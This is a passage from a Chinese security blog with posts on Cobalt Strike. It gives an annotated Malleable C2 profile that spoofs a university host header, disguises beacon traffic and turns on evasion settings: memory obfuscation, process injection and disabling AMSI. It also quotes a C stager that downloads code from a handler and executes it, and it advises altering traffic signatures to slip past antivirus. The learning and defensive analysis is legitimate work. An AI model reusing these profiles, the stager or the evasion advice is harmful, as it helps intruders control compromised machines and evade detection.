&quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;  &#x2F;&#x2F;通过netbios传输信息 </span><br><span class="line">	   </span><br><span class="line">	    prepend &quot;[\&quot;&#123;\\\&quot;results\\\&quot;:[\\\&quot;&#123;\\\\\\\&quot;ID\\\\\\\&quot;:\\\\\\\&quot;Missouri State University Foundation\\\\\\\&quot;,\\\\\\\&quot;Name\\\\\\\&quot;:\\\\\\\&quot;Missouri State University Foundation\\\\\\\&quot;,\\\\\\\&quot;Url\\\\\\\&quot;:\\\\\\\&quot;https:&#x2F;&#x2F;www.missouristatefoundation.org&#x2F;\\\\\\\&quot;,\\\\\\\&quot;Keywords\\\\\\\&quot;:&quot;;</span><br><span class="line"></span><br><span class="line">	    append &quot;\&quot;\\\\\\\&quot;development; endowment; foundation; Foundation, Missouri State; fundraising; missouri state foundation; missouri state university foundation\\\\\\\&quot;,\\\\\\\&quot;UnitType\\\\\\\&quot;:\\\\\\\&quot;Department\\\\\\\&quot;&#125;\\\&quot;,\\\&quot;&#123;\\\\\\\&quot;ID\\\\\\\&quot;:\\\\\\\&quot;Missouri State Outreach\\\\\\\&quot;,\\\\\\\&quot;Name\\\\\\\&quot;:\\\\\\\&quot;Missouri State Outreach\\\\\\\&quot;,\\\\\\\&quot;Url\\\\\\\&quot;:\\\\\\\&quot;https:&#x2F;&#x2F;outreach.missouristate.edu&#x2F;\\\\\\\&quot;,\\\\\\\&quot;Keywords\\\\\\\&quot;:\\\\\\\&quot;distance learning; dual credit; evening; extended campus; Extended Campus (now Missouri State Outreach); i courses; i-courses; icourses; interactive video; itv; non credit; non-credit; noncredit; off campus; off-campus; offcampus; online; outreach; Outreach, Missouri State\\\\\\\&quot;&#125;\&quot;]&quot;;</span><br><span class="line"></span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​         通过上面对于http-post的配置，我们可以看到通过post的方式请求getsearchresults这个uri,并且在请求中加入了site_indexFilter字段，这个字段用来传输命令执行的结果。通过peopleFilter这个字段来返回beacon client对应的id。并且加上了query和resultCounts这两个参数，不过这两个参数的内容都是写死的。最后在server部分我们配置了返回的内容。我们使用wireshark来看下请求的内容与我们的配置是否一致</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902180954689.png" alt="image-20200902180954689"></p>
<p>​        下面我们配置http-stager的信息，我们可以在下面的代码块中定义自己下载stage的行为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-Stager Block###</span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">    set uri_x86 &quot;&#x2F;Events&quot;;  &#x2F;&#x2F;当下在x86的stage时，请求的uri</span><br><span class="line">    set uri_x64 &quot;&#x2F;events&quot;;  &#x2F;&#x2F;当下在x64的stage时，请求的uri</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;search.missouristate.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">        #parameter &quot;test1&quot; &quot;test2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;  &#x2F;&#x2F;配置server返回stage的格式</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        header &quot;Set-Cookie&quot; &quot;WWW-SERVERID&#x3D;handle; path&#x3D;&#x2F;&quot;;  </span><br><span class="line"></span><br><span class="line">        output &#123;  &#x2F;&#x2F;对输出的内容进行配置，这里并没有加上其他的处理</span><br><span class="line">        </span><br><span class="line">            #prepend &quot;content&#x3D;&quot;;  </span><br><span class="line"></span><br><span class="line">            #append &quot;&lt;&#x2F;script&gt;\n&quot;;</span><br><span class="line">            print;   </span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        通过上面的HTTP-Stager的配置后,当stager去请求下载stage时，请求/Events这个uri，并且host的内容都和我们设置的在HTTP-Stager的client中配置的一致。再看看返回包中的内容，请求头中的内容也和我们配置的server部分一致。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172033813.png" alt="image-20200902172033813"></p>
<p>​        再看看可扩展的pe和躲避杀软的模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">###Malleable PE&#x2F;Stage Block###</span><br><span class="line">stage &#123;</span><br><span class="line">    set checksum        &quot;0&quot;;  &#x2F;&#x2F;PE头里checksum的值</span><br><span class="line">    set compile_time    &quot;23 Nov 2018 02:25:37&quot;; &#x2F;&#x2F;beacon pe头中显示的编译的时间</span><br><span class="line">    set entry_point     &quot;170000&quot;; &#x2F;&#x2F;beacon pe头中设置的入口点</span><br><span class="line">    #set image_size_x86 &quot;6586368&quot;;  &#x2F;&#x2F;x86 PE头里写的镜像大小</span><br><span class="line">    #set image_size_x64 &quot;6586368&quot;;  &#x2F;&#x2F;x64 PE头里写的镜像大小</span><br><span class="line">    #set name	        &quot;WWanMM.dll&quot;;   &#x2F;&#x2F;	beacon dll 导出的名字</span><br><span class="line">    set userwx 	        &quot;false&quot;;    &#x2F;&#x2F;反射加载时是否要把内存设置为可读可写可执行</span><br><span class="line">    set cleanup	        &quot;true&quot;;  &#x2F;&#x2F;如果选择是则尝试释放反射加载的dll的内存</span><br><span class="line">    set sleep_mask	&quot;true&quot;;  &#x2F;&#x2F;是否在sleep前在内存中混淆beacon</span><br><span class="line">    set stomppe	        &quot;true&quot;; &#x2F;&#x2F;</span><br><span class="line">    set obfuscate	&quot;true&quot;;  &#x2F;&#x2F;是否混淆反射调用dll的导入表，覆盖无用的header内容，请求反射加载器copy beacon到新的内存没有dll头</span><br><span class="line">    set rich_header     &quot;&quot;;  &#x2F;&#x2F;编译器插入的元信息</span><br><span class="line">    </span><br><span class="line">    set sleep_mask &quot;true&quot;;  &#x2F;&#x2F;是否在sleep前在内存中混淆beacon</span><br><span class="line"></span><br><span class="line">    set module_x86 &quot;wwanmm.dll&quot;;  &#x2F;&#x2F;加载一个dll，然后用beacon去覆盖它分配的空间，而不是用VirtualAlloc去分配内存</span><br><span class="line">    set module_x64 &quot;wwanmm.dll&quot;;</span><br><span class="line"></span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;  &#x2F;&#x2F; 在beacon 反射调用dll之前插入一些数据</span><br><span class="line">        strrep &quot;ReflectiveLoader&quot; &quot;&quot;; </span><br><span class="line">        strrep &quot;beacon.dll&quot; &quot;&quot;;   &#x2F;&#x2F;  查找并替换字符串</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">        strrep &quot;ReflectiveLoader&quot; &quot;&quot;;</span><br><span class="line">        strrep &quot;beacon.x64.dll&quot; &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    #string &quot;something&quot;;   &#x2F;&#x2F;添加字符串</span><br><span class="line">    #data &quot;something&quot;;</span><br><span class="line">    #stringw &quot;something&quot;;   &#x2F;&#x2F;添加UTF-16字符串</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在看看进程注入的部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">###Process Inject Block###</span><br><span class="line">process-inject &#123;</span><br><span class="line"></span><br><span class="line">    set allocator &quot;NtMapViewOfSection&quot;;	&#x2F;&#x2F;在远程进程中分配内存的方式，有两种方式VirtualAllocEx和NtMapViewOfSection，VirtualAlloc是Windows提供的API，通常用来分配大块的内存。例如如果想在进程A和进程B之间通过共享内存的方式实现通信，可以使用该函数（这也是较常用的情况）。利用NtMapViewOfSection在远程进程地址空间写入代码，并且用一种新的技术在远程进程中执行它，这种技术完全工作在用户模式下，并且不需要特殊的条件比如像管理员权限或者之类的要求</span><br><span class="line">    set min_alloc &quot;16700&quot;;  &#x2F;&#x2F;最小的分配内存的大小</span><br><span class="line"></span><br><span class="line">    set userwx &quot;false&quot;;  &#x2F;&#x2F;&#x2F;&#x2F;是否使用rwx作为代码内存的默认权限，默认rx</span><br><span class="line">    </span><br><span class="line">    set startrwx &quot;false&quot;;  &#x2F;&#x2F;是否使用rwx作为代码内存的默认权限,默认rx</span><br><span class="line">        </span><br><span class="line">    transform-x86 &#123;  </span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execute &#123;</span><br><span class="line">        CreateThread &quot;ntdll!RtlUserThreadStart&quot;;    &#x2F;&#x2F;进程可以在其他的进程中创建一个线程 </span><br><span class="line">        CreateThread; </span><br><span class="line">        NtQueueApcThread;  &#x2F;&#x2F;通过NtQueueApcThread实现APC注入</span><br><span class="line">        CreateRemoteThread;</span><br><span class="line">        RtlCreateUserThread;  &#x2F;&#x2F;创建远程线程的一种技术</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        我们再来看看post-ex块，这个模块用来控制后渗透的行为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">###Post-Ex Block###</span><br><span class="line">post-ex &#123;</span><br><span class="line"></span><br><span class="line">    set spawnto_x86 &quot;%windir%\\syswow64\\gpupdate.exe&quot;;  &#x2F;&#x2F;派生后渗透功能的默认临时进程</span><br><span class="line">    set spawnto_x64 &quot;%windir%\\sysnative\\gpupdate.exe&quot;;</span><br><span class="line"></span><br><span class="line">    set obfuscate &quot;true&quot;;  &#x2F;&#x2F;对dll的内容进行加密，并且将post-ex功能建立到内存中，</span><br><span class="line"></span><br><span class="line">    set smartinject &quot;true&quot;; &#x2F;&#x2F;提示beacon将关键的函数指针嵌入到相同架构的post-ex dll中</span><br><span class="line"> </span><br><span class="line">    set amsi_disable &quot;true&quot;;  &#x2F;&#x2F;关闭amsi,AMSI（Antimalware Scan Interface）， 即反恶意软件扫描接口。在Windows Server 2016和Win10上默认安装并启用。</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​            通过上面的学习，大家应该了解了关于Malleable C2 Profile文件编写的基本的方法，可以根据自己的需要编写自己的Malleable C2 Profile文件，当然我们得知道编写profile文件的目的是为了尽量去模拟正常的网站访问流量。</p>
<p><strong>参考文章</strong></p>
<p><a href="https://medium.com/bugbountywriteup/red-team-cobalt-strike-4-0-malleable-c2-profile-guideline-eb3eeb219a7c" target="_blank" rel="noopener">[RED_TEAM] Cobalt Strike 4.0+ Malleable C2 Profile Guideline</a></p>
<p>CobaltStrike4.0用户手册_中文翻译</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">关于cobaltstrike通信流程的分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-09-01 16:15:43 / Modified: 20:16:33" itemprop="dateCreated datePublished" datetime="2020-09-01T16:15:43+08:00">2020-09-01</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        之前我们了解了关于cobaltstrike shell生成的过程，接下来我们一起了解一下cobaltstrike的stager具体是如何工作的，它在目标主机执行后是如何和我们的服务端进行通信的。</p>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>​        在我们分析cobaltstrike的通信过程之前，首先需要了解cobaltstrike的一些基本概念</p>
<p><strong>Staged Payloads</strong></p>
<p>​        执行payload的方式分为两种，一种是分阶段加载（Staged）和不分阶段加载（STAGELESS ）。当使用分阶段加载的方式时，一般把程序分为两个部分，stager和stage，stager通常是一个代码量非常小的精简过的汇编代码，它的作用非常简单，就是用来下载stage并载入到内存,也就是主要完成下载远程的stage文件和分配内存将stage加载到内存并执行的功能。在cobaltstrike的官方博客中，给出了一个简单的stager的代码,主要通过C语言实现，通过wsconnect来和远程的地址建立socket通信，下载远程的文件分配内存并载入到内存，最后通过函数指针的形式来进行调用。之所以这么做主要是为了解决payload大小限制的问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* connect to the handler *&#x2F;</span><br><span class="line">SOCKET my_socket &#x3D; wsconnect(argv[1], atoi(argv[2]));</span><br><span class="line"> </span><br><span class="line">&#x2F;* read the 4-byte length *&#x2F;</span><br><span class="line">int count &#x3D; recv(my_socket, (char *)&amp;size, 4, 0);</span><br><span class="line">if (count !&#x3D; 4 || size &lt;&#x3D; 0)     punt(my_socket, &quot;read a strange or incomplete length value\n&quot;); &#x2F;* allocate a RWX buffer *&#x2F; buffer &#x3D; VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (buffer &#x3D;&#x3D; NULL)     punt(my_socket, &quot;could not allocate buffer\n&quot;); &#x2F;* prepend a little assembly to move our SOCKET value to the EDI register    thanks mihi for pointing this out    BF 78 56 34 12     &#x3D;&gt;      mov edi, 0x12345678 *&#x2F;</span><br><span class="line">buffer[0] &#x3D; 0xBF;</span><br><span class="line"> </span><br><span class="line">&#x2F;* copy the value of our socket to the buffer *&#x2F;</span><br><span class="line">memcpy(buffer + 1, &amp;my_socket, 4);</span><br><span class="line"> </span><br><span class="line">&#x2F;* read bytes into the buffer *&#x2F;</span><br><span class="line">count &#x3D; recv_all(my_socket, buffer + 5, size);</span><br><span class="line"> </span><br><span class="line">&#x2F;* cast our buffer as a function and call it *&#x2F;</span><br><span class="line">function &#x3D; (void (*)())buffer;</span><br><span class="line">function();</span><br></pre></td></tr></table></figure>

<p>​        我们再了解一下为什么要使用分阶段的方式呢？根据作者的描述有以下几点</p>
<ul>
<li>为了解决文件文件大小的问题，另一方面为了和Metasploit兼容</li>
<li>通常stager作为一个加载器并没有做安全处理，而stage则会做比较好的处理，一般如果别人捕获了stager样本并不会造成什么影响。所以使用分阶段的形式也是为了保护stage</li>
</ul>
<p><strong>stageless payload</strong></p>
<p>​        stageless payload顾名思义就是无阶段payload,那么既然我们已经介绍了关于使用分阶段执行payload的好处，为什么还要再去使用无阶段执行payload呢？原因是在内网横向渗透的过程中，因为目标内网的主机可能无法和外网通信，这个时候如果还使用分阶段执行，目标内网的断网机将无法下载到stage。所以在内网渗透的过程中一般使用的是无阶段的payload。</p>
<p><strong>beacon</strong></p>
<p>​        beacon运行在目标主机的用于远程控制的payload，主要用来实现稳定控制目标的功能，并不会实时和cobaltstrike服务端通信，在一段时间后会去检测是否有任务，如果有任务，beacon就会下载任务并且执行。当存在任务时，beacon一般会通过http去输出请求结果，可以通过http或者dns来检查是否有任务。</p>
<h3 id="beacon通信分析"><a href="#beacon通信分析" class="headerlink" title="beacon通信分析"></a>beacon通信分析</h3><h4 id="staged-payload"><a href="#staged-payload" class="headerlink" title="staged payload"></a>staged payload</h4><p>​        我使用wireshark进行分析，当我执行cobaltstrike生成的分阶段执行的payload时，首先会发起一个http请求，他会请求我们建立的listener端口，返回一个很大的内容</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182559711.png" alt="image-20200901182559711"></p>
<p>​        这个请求我们也可以在web日志中查看到</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182724592.png" alt="image-20200901182724592"></p>
<p>​        通过我们之前对分阶段执行payload的了解，我们可以知道这个是去请求stage的请求，我手工请求了以下这个地址，并且将下载后的文件保存为dll文件，将这个dll文件和beacon.dll文件进行对比，发现这两个文件大小基本一致，因此基本可以确定这个请求的开始是加载了beacon.dll这个文件。</p>
<p>​        继续看其他请求包，我们发现当通过get请求activity这个路径，会刷新beacon的时间。</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901193704075.png" alt="image-20200901193704075"></p>
<p>​        我尝试在和beacon进行交互，执行一个ipconfig命令，再抓包进行分析，当要执行命令时，我们可以看到当去请求activity这个路径时，已经有了返回内容</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194454763.png" alt="image-20200901194454763"></p>
<p>​        我们再看下一个包， 可以看到beacon向服务端发起一个post请求，路径为submit.php，并且带有id参数，请求内容为加密后的内容。</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194558581.png" alt="image-20200901194558581"></p>
<p>​        我尝试进行文件操作，发现传输返回结果还是通过向服务端以post形式请求submit.php。所以看到这里大家知道为什么我们明明免杀都过了，一执行就会被360干掉了，我如果是360，我也知道看有没有通过请求active和submit提交一些加密代码来判断是不是cs的shell了，所以做免杀的时候一定要去改流量特征。</p>
<h4 id="stageless-payload"><a href="#stageless-payload" class="headerlink" title="stageless payload"></a>stageless payload</h4><p>​        我们再生成一个无阶段的payload执行，再看看通信的流程。</p>
<p>​        当我执行生成的无阶段的payload时，我发现并没有发送其他包，而是只发送了一个get请求请求match这个路径。当请求了match这个路径，服务端的延时就会刷新一次，所以我们知道这个请求是获取服务端执行命令的请求。</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901195732678.png" alt="image-20200901195732678"></p>
<p>​        当我们执行ipconfig这个命令后，通过抓包分析，我们发现match会返回一个结果，这个就是需要执行的命令。</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200101283.png" alt="image-20200901200101283"></p>
<p>​        再看这个请求的下一个数据包，会去请求submit.php，去传递命令执行的结果</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200145700.png" alt="image-20200901200145700"></p>
<p>​        所以我们可以知道再cobaltstrike4.0中，如果使用无阶段的payload放到目标主机执行，会在请求过程中发送大量请求match和submit.php的数据包，这个就可以当作一个流量特征来进行处理。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过关于beacon的流量分析，我们应该了解了关于beacon通信和加载的方式，也应该明白了为什么我们使用CobaltStrike一定要改流量特征了吧。</p>
<p><strong>参考文章</strong></p>
<p><a href="https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/" target="_blank" rel="noopener">Staged Payloads – What Pen Testers Should Know</a></p>
<p><a href="https://blog.cobaltstrike.com/2016/06/15/what-is-a-stageless-payload-artifact/" target="_blank" rel="noopener">What is a stageless payload artifact?</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于CobaltStrike生成shell的过程和执行流程的分析学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-31 17:21:58" itemprop="dateCreated datePublished" datetime="2020-08-31T17:21:58+08:00">2020-08-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-01 16:04:55" itemprop="dateModified" datetime="2020-09-01T16:04:55+08:00">2020-09-01</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        可能我们在后渗透阶段使用CobaltStrike使用的是比较多的，关于一款工具，我们不仅仅只能停留在如何使用它，我们也应该了解一下它实现的原理，本文将带着大家和我一起学习关于CoblatStrike这款工具shell生成的过程还有执行流程。我这里是以CobaltStrike4.0为例来进行分析的。</p>
<p>​        首先我们将CobaltStrike导入到IDEA中，对着CobaltStrike.jar右键选择-add as libirary,那样我们就可以在IDEA中查看这个包反编译的代码，IDEA反编译代码的还原度还是非常高的。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831173535104.png" alt="image-20200831173535104"></p>
<h3 id="payload-generator"><a href="#payload-generator" class="headerlink" title="payload generator"></a>payload generator</h3><p>​        CobaltStrike所有的ui在aggressor\dialogs\目录下，因此我们如果想要知道在我们点击了某个按键后CobaltStrike执行了什么操作，在这个目录下找就可以了，因为我们想查看在生成paylad的时候执行了什么操作，因此找payload generator就可以了，我们先看一下dialogAction这个方法中的逻辑。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831174257725.png" alt="image-20200831174257725"></p>
<p>​        这个逻辑我们根据生成payload的窗口可能更好理解一些,我把我的分析写到注释里</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831174544179.png" alt="image-20200831174544179"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public void dialogAction(ActionEvent var1, Map var2) &#123;</span><br><span class="line">    this.options &#x3D; var2;</span><br><span class="line">    boolean var3 &#x3D; DialogUtils.bool(var2, &quot;x64&quot;); &#x2F;&#x2F;判断是否生成x64的payload</span><br><span class="line">    String var4 &#x3D; DialogUtils.string(var2, &quot;listener&quot;); &#x2F;&#x2F;接收listener的值</span><br><span 